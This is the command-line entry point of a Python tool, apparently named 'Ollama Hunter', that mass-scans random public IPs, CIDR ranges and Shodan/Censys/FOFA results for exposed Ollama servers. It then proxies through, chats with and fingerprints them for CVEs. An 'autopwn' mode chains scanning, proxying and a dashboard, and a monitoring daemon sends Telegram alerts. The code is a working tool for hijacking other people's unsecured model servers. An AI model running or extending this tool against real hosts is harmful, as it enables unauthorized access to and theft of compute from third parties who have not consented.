    do_export(found_instances, "html")
    
    # Start dashboard (which also shows proxy options)
    log(f"🌐 Starting dashboard...", "OK")
    start_web_dashboard(host, proxy_port)

# ============================================================
# CLI MAIN
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="🦙 Ollama Hunter v2.0 — Find exposed Ollama instances & proxy through them",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # SCANNING
  %(prog)s scan --random 10000
  %(prog)s scan --masscan 0.0.0.0/8
  %(prog)s scan --cidr 10.0.0.0/24
  %(prog)s scan --shodan API_KEY
  %(prog)s scan --censys API_ID:SECRET
  
  # PROXY
  %(prog)s proxy --target 1.2.3.4:11434
  %(prog)s proxy --auto
  
  # WEB DASHBOARD
  %(prog)s web
  
  # CHAT
  %(prog)s chat --target 1.2.3.4:11434
  
  # EXPORT
  %(prog)s export --format html
  
  # FINGERPRINT
  %(prog)s fingerprint --target 1.2.3.4:11434
  
  # MONITOR
  %(prog)s monitor --interval 3600 --random 5000
  
  # AUTO-PWN
  %(prog)s autopwn --random 10000 --port 9090
        """
    )
    
    subparsers = parser.add_subparsers(dest="command")
    
    # ─── SCAN ───
    sp = subparsers.add_parser("scan", help="Scan for instances (TCP/masscan/Shodan/Censys/FOFA)")
    sg = sp.add_mutually_exclusive_group(required=True)
    sg.add_argument("--random", type=int, metavar="N", help="Scan N random public IPs")
    sg.add_argument("--masscan", type=str, metavar="RANGE", help="Masscan a range (e.g., 0.0.0.0/8)")
    sg.add_argument("--cidr", type=str, metavar="CIDR", help="Scan a CIDR range")
    sg.add_argument("--file", type=str, metavar="FILE", help="Scan IPs from file")
    sg.add_argument("--shodan", type=str, metavar="KEY", help="Search Shodan")
    sg.add_argument("--censys", type=str, metavar="ID:SECRET", help="Search Censys")
    sg.add_argument("--fofa", type=str, metavar="EMAIL:KEY", help="Search FOFA")
    sp.add_argument("--port", type=int, default=DEFAULT_OLLAMA_PORT)
    sp.add_argument("--concurrent", type=int, default=MAX_CONCURRENT)
    sp.add_argument("--timeout", type=int, default=SCAN_TIMEOUT)
    sp.add_argument("--output", type=str, default=FOUND_DB)
    sp.add_argument("--rate", type=int, default=10000, help="Masscan rate (pkts/s)")
    sp.add_argument("--geo", action="store_true", help="Geolocate found instances")
    sp.add_argument("--export", type=str, choices=["html","csv","json","all"], help="Auto-export results")
    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
    
    # ─── PROXY ───
    sp = subparsers.add_parser("proxy", help="Start a proxy to a remote Ollama instance")
    sp.add_argument("--target", "-t", type=str, help="Target (ip:port)")
    sp.add_argument("--auto", action="store_true", help="Auto-proxy first found instance")
    sp.add_argument("--port", "-p", type=int, default=8080)
    sp.add_argument("--host", type=str, default="127.0.0.1")
    sp.add_argument("--all", action="store_true", help="Proxy ALL found instances on different ports")
    
    # ─── CHAT ───
    sp = subparsers.add_parser("chat", help="Interactive chat with remote model")
    sp.add_argument("--target", "-t", type=str, required=True)
    
    # ─── WEB ───
    sp = subparsers.add_parser("web", help="Start web dashboard")
    sp.add_argument("--port", "-p", type=int, default=5000)
    sp.add_argument("--host", type=str, default="127.0.0.1")
    sp.add_argument("--open", action="store_true", default=True, help="Open browser")
    
    # ─── EXPORT ───
    sp = subparsers.add_parser("export", help="Export found instances")
    sp.add_argument("--format", "-f", type=str, default="html", choices=["html","csv","json","all"])
    sp.add_argument("--output", "-o", type=str, help="Output file path")
    
    # ─── FINGERPRINT ───
    sp = subparsers.add_parser("fingerprint", help="Deep fingerprint an instance")
    sp.add_argument("--target", "-t", type=str, required=True)
    
    # ─── SHOW ───
    sp = subparsers.add_parser("show", help="Show found instances")
    sp.add_argument("--geo", action="store_true", help="Show with geolocation")
    sp.add_argument("--export", type=str, choices=["html","csv","json"], help="Export and show")
    
    # ─── MONITOR ───
    sp = subparsers.add_parser("monitor", help="Continuous monitoring daemon")
    sp.add_argument("--interval", type=int, default=3600, help="Seconds between scans")
    sp.add_argument("--random", type=int, default=5000, help="IPs per scan")
    sp.add_argument("--notify", action="store_true", help="Enable notifications")
    sp.add_argument("--export", type=str, choices=["html","csv","json","all"], help="Auto export")
    
    # ─── CONFIG ───
    sp = subparsers.add_parser("config", help="View/edit configuration")
    sp.add_argument("--show", action="store_true", help="Show current config")
    sp.add_argument("--set", type=str, nargs=2, metavar=("KEY","VALUE"), help="Set config value")
    sp.add_argument("--telegram-token", type=str, help="Set Telegram bot token")
    sp.add_argument("--telegram-chat", type=str, help="Set Telegram chat ID")
    sp.add_argument("--shodan-key", type=str, help="Set Shodan API key")
    
    # ─── AUTOPWN ───
    sp = subparsers.add_parser("autopwn", help="Auto: scan → proxy → dashboard")
    sp.add_argument("--random", type=int, default=5000)
    sp.add_argument("--port", "-p", type=int, default=9090)
    sp.add_argument("--host", type=str, default="127.0.0.1")
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    print(BANNER)
    
    # ─── COMMAND DISPATCH ───
    
    if args.command == "scan":
        # Update module vars
        import sys as _sys
        _sys.modules[__name__].SCAN_TIMEOUT = args.timeout
        _sys.modules[__name__].MAX_CONCURRENT = args.concurrent
        _sys.modules[__name__].FOUND_DB = args.output
        
        found = []
        
        if args.random:
            ips = generate_random_ips(args.random)
            found = asyncio.run(scan_ips(ips, args.port, args.concurrent))
        elif args.masscan:
            result = scan_masscan(args.masscan, args.port, args.rate)
            if result is None:
                # Fallback to async scan
                ips = ips_from_cidr(args.masscan) if "/" in args.masscan else []
                if ips:
                    found = asyncio.run(scan_ips(ips, args.port, args.concurrent))
            else:
                found = result
        elif args.cidr:
            ips = ips_from_cidr(args.cidr)
            if ips:
                found = asyncio.run(scan_ips(ips, args.port, args.concurrent))
        elif args.file:
            ips = ips_from_file(args.file)
            if ips:
                found = asyncio.run(scan_ips(ips, args.port, args.concurrent))
        elif args.shodan:
            found = search_shodan(args.shodan, args.port)
        elif args.censys:
            parts = args.censys.split(":", 1)
            if len(parts) == 2:
                found = search_censys(parts[0], parts[1], args.port)
            else:
                log("Censys format: ID:SECRET", "ERROR")
        elif args.fofa:
            parts = args.fofa.split(":", 1)
            if len(parts) == 2:
                found = search_fofa(parts[0], parts[1], args.port)
            else:
                log("FOFA format: EMAIL:KEY", "ERROR")
        
        # Post-scan processing
        if args.geo and found:
            log("📍 Geolocating instances...", "INFO")
            found = batch_geolocate(found)
            # Re-save with geo
            for inst in found:
                save_found(inst)
        
        if args.export and found:
            instances = load_found()
            do_export(instances, args.export)
        
        if args.notify and found:
            for inst in found:
                notify_found(inst)
    
    elif args.command == "proxy":
        if args.auto:
            instances = load_found()
            if not instances:
                log("No instances in database. Run scan first.", "ERROR")
                return
            target = f"{instances[0]['ip']}:{instances[0].get('port', 11434)}"
            log(f"🎯 Auto-selected: {target}", "OK")
            start_proxy(target, args.port, args.host)
        elif args.all:
            instances = load_found()
            if not instances:
                log("No instances in database.", "ERROR")
                return
            import threading
            for i, inst in enumerate(instances):
                port = args.port + i
                target = f"{inst['ip']}:{inst.get('port', 11434)}"
                t = threading.Thread(target=start_proxy, args=(target, port, args.host), daemon=True)
                t.start()
                time.sleep(1)
            log(f"🔌 {len(instances)} proxies started on ports {args.port}-{args.port+len(instances)-1}", "OK")
            # Keep alive
            try:
                while True: time.sleep(60)
            except KeyboardInterrupt:
                log("Stopped.", "INFO")
        else:
            if not args.target:
                log("Specify --target or --auto", "ERROR")
                return
            start_proxy(args.target, args.port, args.host)
    
    elif args.command == "chat":
        interactive_chat(args.target)
    
    elif args.command == "web":
        start_web_dashboard(args.host, args.port)
    
    elif args.command == "export":
        instances = load_found()
        if not instances:
            log("No instances to export. Run scan first.", "WARN")
            return
        do_export(instances, args.format)
    
    elif args.command == "fingerprint":
        log(f"🔍 Fingerprinting {args.target}...", "INFO")
        fp = fingerprint_instance(args.target)
        print(f"\n{'='*60}")
        print(f"  Fingerprint: {args.target}")
        print(f"{'='*60}")
        print(f"  Version:     {fp['version']}")
        print(f"  Models:      {fp['model_count']} ({', '.join(fp['models'][:5])})")
        if fp['model_count'] > 5:
            print(f"               ... and {fp['model_count']-5} more")
        print(f"  Total Size:  {fp['total_model_size_gb']} GB")
        print(f"  Response:    {fp['response_time_ms'].get('total', '?')}ms")
        print(f"  CVEs:        {len(fp['cves'])}")
        for cve in fp['cves']:
            print(f"     ⚠ {cve['id']}: {cve['desc']} [{cve['severity']}]")
        print(f"  Endpoints:   {', '.join(fp['accessible_endpoints'])}")
        if fp.get('running_models'):
            print(f"  Running:     {', '.join(fp['running_models'])}")
        print(f"{'='*60}\n")
    
    elif args.command == "show":
        instances = load_found()
        if not instances:
            log("No instances found yet.", "WARN")
            return
        
        if args.geo:
            instances = batch_geolocate(instances)
        
        print(f"\n{'='*90}")
        print(f"  🦙 Found Ollama Instances ({len(instances)} total)")
        print(f"{'='*90}")
        
        for i, inst in enumerate(instances, 1):
            models = inst.get("models", [])
            models_str = ", ".join(models[:6])
            if len(models) > 6: models_str += f" ... (+{len(models)-6})"
            geo = inst.get("geo") or {}
            loc = f"{geo.get('city','?')}, {geo.get('country','?')}" if geo else "?"
            cve_count = len(inst.get("cves", []))
            cve_str = f" ⚠{cve_count}CVE" if cve_count else ""
            
            print(f"\n  {i:2d}. {inst['ip']}:{inst.get('port', 11434)}")
            print(f"      Version: {inst.get('version', '?')}{cve_str}")
            print(f"      Models:  {models_str} ({inst.get('model_count', len(models))} total)")
            print(f"      Location: {loc}")
            print(f"      Found:   {inst.get('timestamp', '?')}")
            print(f"      Commands: ollama-hunter proxy -t {inst['ip']}:{inst.get('port', 11434)}")
            print(f"                ollama-hunter chat -t {inst['ip']}:{inst.get('port', 11434)}")
        
        print(f"\n{'='*90}\n")
        
        if args.export:
            do_export(instances, args.export)
    
    elif args.command == "monitor":
        cfg = get_config()
        if args.notify:
            cfg["notify_on_find"] = True
        if args.export:
            cfg["auto_export"] = True
            cfg["export_format"] = args.export
        save_config(cfg)
        monitoring_daemon(args.interval, args.random)
    
    elif args.command == "config":
        if args.show:
            cfg = get_config()
            print(json.dumps(cfg, indent=2))
        elif args.set:
            k, v = args.set
            cfg = get_config()
            cfg[k] = v
            save_config(cfg)
            log(f"✅ Config: {k} = {v[:4]}...{v[-4:]}" if len(v) > 8 else f"✅ Config: {k} = {v}", "OK")
        else:
            if args.telegram_token:
                cfg = get_config(); cfg["telegram_token"] = args.telegram_token; save_config(cfg)
                log("✅ Telegram token set", "OK")
            if args.telegram_chat:
                cfg = get_config(); cfg["telegram_chat_id"] = args.telegram_chat; save_config(cfg)
                log("✅ Telegram chat ID set", "OK")
            if args.shodan_key:
                cfg = get_config(); cfg["shodan_key"] = args.shodan_key; save_config(cfg)
                log("✅ Shodan key set", "OK")
    
    elif args.command == "autopwn":
        autopwn(args.random, args.port, args.host)


if __name__ == "__main__":
    main()
